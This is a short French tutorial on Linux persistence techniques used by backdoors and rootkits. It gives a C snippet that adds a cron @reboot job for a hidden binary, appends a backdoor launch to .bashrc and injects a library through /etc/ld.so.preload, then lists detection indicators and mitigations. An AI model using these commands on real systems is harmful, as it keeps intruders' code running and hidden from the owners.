# Linux Persistence - Survivre aux Redémarrages

Cron jobs, systemd services, .bashrc hijacking, LD_PRELOAD, init scripts - techniques pour maintenir accès après redémarrage Linux. Utilisé par rootkits et backdoors pour persistence long-terme.

⚠️ AVERTISSEMENT STRICT : Techniques de malware development avancées. Usage éducatif uniquement. Tests sur VM isolées. Usage malveillant = PRISON.

```c
// Cron job persistence
system("(crontab -l 2>/dev/null; echo '@reboot /tmp/.hidden') | crontab -");

// .bashrc persistence
FILE *f = fopen(bashrc_path, "a");
fprintf(f, "\n/tmp/.backdoor &\n");
fclose(f);

// LD_PRELOAD hijacking
system("echo '/tmp/malicious.so' >> /etc/ld.so.preload");
```

## Compilation

```bash
gcc example.c -o persist_linux
```

## Concepts clés

- **Cron Jobs** : @reboot, @daily pour exécution programmée
- **Systemd Services** : .service files dans /etc/systemd/system/
- **.bashrc/.profile** : Exécution au login shell (user-level)
- **/etc/profile** : Global pour tous users (nécessite root)
- **LD_PRELOAD** : /etc/ld.so.preload pour injection bibliothèque
- **Init Scripts** : /etc/rc.local, /etc/init.d/ (SysV)
- **XDG Autostart** : ~/.config/autostart/ (desktop environments)

## Techniques utilisées par

- **Linux.Mirai** : Cron jobs + .bashrc modification
- **XorDDoS** : Init scripts + systemd services
- **Turla (Snake)** : LD_PRELOAD rootkit + systemd
- **HiddenWasp** : /etc/ld.so.preload + init scripts
- **Rocke Cryptominer** : Cron @reboot + systemd persistence

## Détection et Mitigation

**Indicateurs** :
- Nouveaux cron jobs suspects (crontab -l)
- Services systemd non-standard (systemctl list-units)
- Modifications .bashrc/.profile timestamps
- /etc/ld.so.preload existence (normalement vide)
- Init scripts non-signés dans /etc/init.d/

**Mitigations** :
- chkrootkit scan régulier (détection rootkits)
- rkhunter --check (scan persistence)
- auditd monitoring (file access logs)
- Immutable flags sur fichiers critiques (chattr +i)
- SELinux/AppArmor policies strictes
